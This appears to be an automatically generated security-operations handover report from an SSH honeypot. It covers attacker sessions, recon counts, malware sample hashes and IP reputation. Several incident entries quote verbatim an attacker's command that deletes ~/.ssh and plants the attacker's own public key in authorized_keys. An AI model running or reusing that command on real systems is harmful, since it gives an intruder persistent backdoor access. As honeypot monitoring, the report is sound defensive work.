### 🔴 HIGH · IR-f5335c6ed121

| Field | Detail |
|---|---|
| **Source IP** | `38.137.11[.]14` |
| **First Seen** | 2026-04-17 16:15 |
| **Last Seen** | 2026-04-17 16:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 16:15:54` | `cowrie.session.connect` |
| `2026-04-17 16:15:54` | `cowrie.client.version` |
| `2026-04-17 16:15:54` | `cowrie.client.kex` |
| `2026-04-17 16:15:54` | `cowrie.login.success` |
| `2026-04-17 16:15:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.137.11[.]14` to AbuseIPDB if not already reported
- [ ] Block `38.137.11[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-563048055d42

| Field | Detail |
|---|---|
| **Source IP** | `38.137.11[.]14` |
| **First Seen** | 2026-04-17 16:17 |
| **Last Seen** | 2026-04-17 16:17 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 16:17:56` | `cowrie.session.connect` |
| `2026-04-17 16:17:56` | `cowrie.client.version` |
| `2026-04-17 16:17:56` | `cowrie.client.kex` |
| `2026-04-17 16:17:57` | `cowrie.login.success` |
| `2026-04-17 16:17:57` | `cowrie.session.params` |
| `2026-04-17 16:17:57` | `cowrie.command.input` |
| `2026-04-17 16:17:57` | `cowrie.command.failed` |
| `2026-04-17 16:17:57` | `cowrie.log.closed` |
| `2026-04-17 16:17:57` | `cowrie.session.params` |
| `2026-04-17 16:17:57` | `cowrie.command.input` |
| `2026-04-17 16:17:57` | `cowrie.session.file_download` |
| `2026-04-17 16:17:57` | `cowrie.log.closed` |
| `2026-04-17 16:17:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.137.11[.]14` to AbuseIPDB if not already reported
- [ ] Block `38.137.11[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49fbeca62362

| Field | Detail |
|---|---|
| **Source IP** | `38.137.11[.]14` |
| **First Seen** | 2026-04-17 16:17 |
| **Last Seen** | 2026-04-17 16:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 16:17:58` | `cowrie.session.connect` |
| `2026-04-17 16:17:58` | `cowrie.client.version` |
| `2026-04-17 16:17:58` | `cowrie.client.kex` |
| `2026-04-17 16:17:58` | `cowrie.login.success` |
| `2026-04-17 16:17:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.137.11[.]14` to AbuseIPDB if not already reported
- [ ] Block `38.137.11[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85c60dbed6c4

| Field | Detail |
|---|---|
| **Source IP** | `38.137.11[.]14` |
| **First Seen** | 2026-04-17 16:22 |
| **Last Seen** | 2026-04-17 16:22 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 16:22:02` | `cowrie.session.connect` |
| `2026-04-17 16:22:02` | `cowrie.client.version` |
| `2026-04-17 16:22:02` | `cowrie.client.kex` |
| `2026-04-17 16:22:02` | `cowrie.login.success` |
| `2026-04-17 16:22:03` | `cowrie.session.params` |
| `2026-04-17 16:22:03` | `cowrie.command.input` |
| `2026-04-17 16:22:03` | `cowrie.command.failed` |
| `2026-04-17 16:22:03` | `cowrie.log.closed` |
| `2026-04-17 16:22:03` | `cowrie.session.params` |
| `2026-04-17 16:22:03` | `cowrie.command.input` |
| `2026-04-17 16:22:03` | `cowrie.session.file_download` |
| `2026-04-17 16:22:03` | `cowrie.log.closed` |
| `2026-04-17 16:22:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.137.11[.]14` to AbuseIPDB if not already reported
- [ ] Block `38.137.11[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29fd271ad0ce

| Field | Detail |
|---|---|
| **Source IP** | `38.137.11[.]14` |
| **First Seen** | 2026-04-17 16:22 |
| **Last Seen** | 2026-04-17 16:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 16:22:04` | `cowrie.session.connect` |
| `2026-04-17 16:22:04` | `cowrie.client.version` |
| `2026-04-17 16:22:04` | `cowrie.client.kex` |
| `2026-04-17 16:22:04` | `cowrie.login.success` |
| `2026-04-17 16:22:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.137.11[.]14` to AbuseIPDB if not already reported
- [ ] Block `38.137.11[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-405357354712

| Field | Detail |
|---|---|
| **Source IP** | `58.33.97[.]119` |
| **First Seen** | 2026-04-17 16:22 |
| **Last Seen** | 2026-04-17 16:22 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 16:22:13` | `cowrie.session.connect` |
| `2026-04-17 16:22:13` | `cowrie.client.version` |
| `2026-04-17 16:22:13` | `cowrie.client.kex` |
| `2026-04-17 16:22:14` | `cowrie.login.success` |
| `2026-04-17 16:22:14` | `cowrie.session.params` |
| `2026-04-17 16:22:14` | `cowrie.command.input` |
| `2026-04-17 16:22:14` | `cowrie.command.failed` |
| `2026-04-17 16:22:14` | `cowrie.log.closed` |
| `2026-04-17 16:22:15` | `cowrie.session.params` |
| `2026-04-17 16:22:15` | `cowrie.command.input` |
| `2026-04-17 16:22:15` | `cowrie.session.file_download` |
| `2026-04-17 16:22:15` | `cowrie.log.closed` |
| `2026-04-17 16:22:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.33.97[.]119` to AbuseIPDB if not already reported
- [ ] Block `58.33.97[.]119` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1bb4d4b98ce

| Field | Detail |
|---|---|
| **Source IP** | `58.33.97[.]119` |
| **First Seen** | 2026-04-17 16:22 |
| **Last Seen** | 2026-04-17 16:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 16:22:22` | `cowrie.session.connect` |
| `2026-04-17 16:22:22` | `cowrie.client.version` |
| `2026-04-17 16:22:22` | `cowrie.client.kex` |
| `2026-04-17 16:22:22` | `cowrie.login.success` |
| `2026-04-17 16:22:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.33.97[.]119` to AbuseIPDB if not already reported
- [ ] Block `58.33.97[.]119` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ec0eda8fad7

| Field | Detail |
|---|---|
| **Source IP** | `38.137.11[.]14` |
| **First Seen** | 2026-04-17 16:23 |
| **Last Seen** | 2026-04-17 16:23 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 16:23:27` | `cowrie.session.connect` |
| `2026-04-17 16:23:27` | `cowrie.client.version` |
| `2026-04-17 16:23:27` | `cowrie.client.kex` |
| `2026-04-17 16:23:28` | `cowrie.login.success` |
| `2026-04-17 16:23:28` | `cowrie.session.params` |
| `2026-04-17 16:23:28` | `cowrie.command.input` |
| `2026-04-17 16:23:28` | `cowrie.command.failed` |
| `2026-04-17 16:23:28` | `cowrie.log.closed` |
| `2026-04-17 16:23:28` | `cowrie.session.params` |
| `2026-04-17 16:23:28` | `cowrie.command.input` |
| `2026-04-17 16:23:28` | `cowrie.session.file_download` |
| `2026-04-17 16:23:28` | `cowrie.log.closed` |
| `2026-04-17 16:23:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.137.11[.]14` to AbuseIPDB if not already reported
- [ ] Block `38.137.11[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3eee8fea47d

| Field | Detail |
|---|---|
| **Source IP** | `38.137.11[.]14` |
| **First Seen** | 2026-04-17 16:23 |
| **Last Seen** | 2026-04-17 16:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 16:23:29` | `cowrie.session.connect` |
| `2026-04-17 16:23:29` | `cowrie.client.version` |
| `2026-04-17 16:23:29` | `cowrie.client.kex` |
| `2026-04-17 16:23:29` | `cowrie.login.success` |
| `2026-04-17 16:23:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.137.11[.]14` to AbuseIPDB if not already reported
- [ ] Block `38.137.11[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `38.137.11[.]14` | **25** | 2026-04-17 16:06 | 2026-04-17 16:24 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `58.33.97[.]119` | **25** | 2026-04-17 16:08 | 2026-04-17 16:29 | 42m | 3 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `49.88.156[.]34` | **2** | 2026-04-17 16:05 | 2026-04-17 16:07 | 2m | 0 | `T1592` | 🟢 LOW |
| `102.213.34[.]99` | 1 | 2026-04-17 16:07 | 2026-04-17 16:07 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `114.98.230[.]202` | 1 | 2026-04-17 16:08 | 2026-04-17 16:10 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.16.132[.]80` | 1 | 2026-04-17 15:18 | 2026-04-17 15:18 | 14s | 0 | `T1592` | 🟢 LOW |
| `14.103.118[.]140` | 1 | 2026-04-17 16:10 | 2026-04-17 16:10 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (22 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 42/100 | 🟡 MEDIUM | **31/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `102.213.34[.]99` | AO | NETSPACE -SERVICOS DE TELECOMUNICACOES, LDA | **100** ⚠️ | 7 |
| `118.16.132[.]80` | JP | NTT DOCOMO,INC. | **100** ⚠️ | 9 |
| `114.98.230[.]202` | CN | CHINANET Anhui PROVINCE NETWORK | **100** ⚠️ | 50 |
| `49.88.156[.]34` | CN | CHINANET jiangsu province network | **100** ⚠️ | 50 |
| `38.137.11[.]14` | IN | Netplus Broadband Services Pvt ltd | **100** ⚠️ | 50 |
| `14.103.118[.]140` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `58.33.97[.]119` | CN | CHINANET Shanghai province network | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 75 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 30 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 22 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 11 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 11 |

---

## 🔕 False Positive Summary (1 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 79 cases |
| Tool 34  | Credential Extractor        | ✅ 52 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 2 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 8 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 1 filtered (1.3%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 8 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 22 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 22 priority case(s) shown individually · 7 recon entry/entries in table (3 group(s) consolidating 52 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-17T16:58:38Z_
